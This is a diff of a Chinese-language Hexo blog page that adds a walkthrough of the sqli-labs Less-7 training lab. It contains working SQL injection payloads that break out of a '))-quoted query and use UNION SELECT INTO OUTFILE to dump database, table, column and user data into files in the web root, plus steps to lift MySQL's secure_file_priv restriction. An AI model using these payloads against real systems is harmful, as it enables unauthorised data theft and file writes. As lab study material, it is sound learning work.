@@ -7,15 +7,15 @@
   
   <title>MYSQL | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="一.预备1.利用load_flie()函数导出文件： load_file(file_name):读取文件并返回该文件的内容作为一个字符串。  注.使用条件： a.必须有权限读取并且文件必须完全可读。当文件不存在或者没有权限访问时函数的返回值为空。 b.欲读取文件必须在服务器上。 c.必须指定文件完整的路径。 d.欲读取文件必须小于 max_allowed_packet。">
+  <meta name="description" content="一.预备1.利用load_flie()函数导出文件： load_file(file_name):读取文件并返回该文件的内容作为一个字符串。  注.使用条件： a.必须有权限读取并且文件必须完全可读。当文件不存在或者没有权限访问时函数的返回值为空。 b.欲读取文件必须在服务器上。 c.必须指定文件完整的路径。 d.欲读取文件必须小于 max_allowed_packet。 二.lesson7实战A.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="MYSQL">
 <meta property="og:url" content="http://example.com/2020/11/29/blog%20g/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="一.预备1.利用load_flie()函数导出文件： load_file(file_name):读取文件并返回该文件的内容作为一个字符串。  注.使用条件： a.必须有权限读取并且文件必须完全可读。当文件不存在或者没有权限访问时函数的返回值为空。 b.欲读取文件必须在服务器上。 c.必须指定文件完整的路径。 d.欲读取文件必须小于 max_allowed_packet。">
+<meta property="og:description" content="一.预备1.利用load_flie()函数导出文件： load_file(file_name):读取文件并返回该文件的内容作为一个字符串。  注.使用条件： a.必须有权限读取并且文件必须完全可读。当文件不存在或者没有权限访问时函数的返回值为空。 b.欲读取文件必须在服务器上。 c.必须指定文件完整的路径。 d.欲读取文件必须小于 max_allowed_packet。 二.lesson7实战A.">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-11-29T08:49:29.000Z">
-<meta property="article:modified_time" content="2020-11-29T12:50:03.456Z">
+<meta property="article:modified_time" content="2020-12-10T09:12:24.775Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="lesson7">
 <meta name="twitter:card" content="summary">
@@ -96,6 +96,48 @@
 <p>b.欲读取文件必须在服务器上。</p>
 <p>c.必须指定文件完整的路径。</p>
 <p>d.欲读取文件必须小于 max_allowed_packet。</p>
+<h4 id="二-lesson7实战"><a href="#二-lesson7实战" class="headerlink" title="二.lesson7实战"></a>二.lesson7实战</h4><h5 id="A-查找注入点："><a href="#A-查找注入点：" class="headerlink" title="A.查找注入点："></a>A.查找注入点：</h5><p>查询源代码——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以得知注入类型为：’))</p>
+<p>构造语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;)) or 1&#x3D;1--+;</span><br></pre></td></tr></table></figure>
+
+<p>返回正常。</p>
+<h5 id="B1-数据库中导出文件"><a href="#B1-数据库中导出文件" class="headerlink" title="B1.数据库中导出文件"></a>B1.数据库中导出文件</h5><p>遇到问题：输入语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;))union select 1,2,database() into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\1.txt&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>在指定目录下未生成相应名为“1”的文件</p>
+<p>由前人指点：mysql最初对文件的导入和导出有限制，因此应当先取消该限制</p>
+<p>在mysql数据库中执行语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>发现本地value的值为NULL。NULL表示禁止。即禁止将产生的文件导入mysql目录下（注：如果这里value值有文件夹目录，则表示只允许该目录下文件。如果为空，则表示不限制目录。）</p>
+<p>既然问题找到了，那就解决它——去掉导入目录的限制：在mysql配置文件my.ini中加入语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv &#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>然后重启mysql，在执行上述语句则在指定目录下找到指定文件。</p>
+<p>由于我们刚刚没有规定产生的文件导出到哪里，因此在导出文件时要表明目录地址。</p>
+<p>在mysql数据库中输入语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *from users into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\1.txt&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>则可在指定目录下找到该文件，得到users的全部内容。（注文件一定要是导出目录下不存在的新名字文件）</p>
+<h5 id="B2-在B1的操作之后就可以开始常规流程："><a href="#B2-在B1的操作之后就可以开始常规流程：" class="headerlink" title="B2.在B1的操作之后就可以开始常规流程："></a>B2.在B1的操作之后就可以开始常规流程：</h5><p>1.爆库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;))union select 1,2,database() into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\1.txt&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>点开1.txt的文件可以发现里面包含数据库名</p>
+<p>2.爆表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;))union select 1,2,table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\2.txt&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>点开2.txt的文件可以发现里面包含库名为security下的所有表的表名</p>
+<p>3.爆列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;))union select 1,2,column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\3.txt&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>点开3.txt的文件可以发现里面包含库名为security下表名为usesr的列的所有列名</p>
+<p>4.爆值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;))union select *from users into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\4.txt&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>点开4.txt的文件可以发现里面包含库名为security下表名为usesr的所有数据值。</p>
 
       
     </div>
